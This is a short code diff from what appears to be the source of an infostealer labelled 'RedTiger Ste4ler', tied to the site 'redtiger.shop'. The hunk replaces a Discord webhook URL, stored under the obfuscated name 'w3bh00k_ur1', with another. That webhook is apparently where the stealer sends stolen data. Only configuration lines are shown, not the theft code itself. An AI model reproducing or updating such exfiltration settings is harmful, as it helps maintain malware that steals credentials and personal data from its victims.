@@ -108,7 +108,7 @@ def Clear():
     except:
         pass
 
-w3bh00k_ur1 = "https://discord.com/api/webhooks/1291062148973334589/I6a5nJ6VoFTUjKE5DJbSgCMfeHZ-f2Ksc5964Q5fTpWZvcx3O52MdOtegmPMonr2fjb6"
+w3bh00k_ur1 = "https://canary.discord.com/api/webhooks/1289721464890593291/M3VTH-R-s88b79-UpmJTxM3VA0oQAwJk1W60T5PrOn0MLy_73k3rfMFmspjMcj70sJ_4"
 website = "redtiger.shop"
 color_embed = 0xa80505
 username_embed = 'RedTiger Ste4ler'
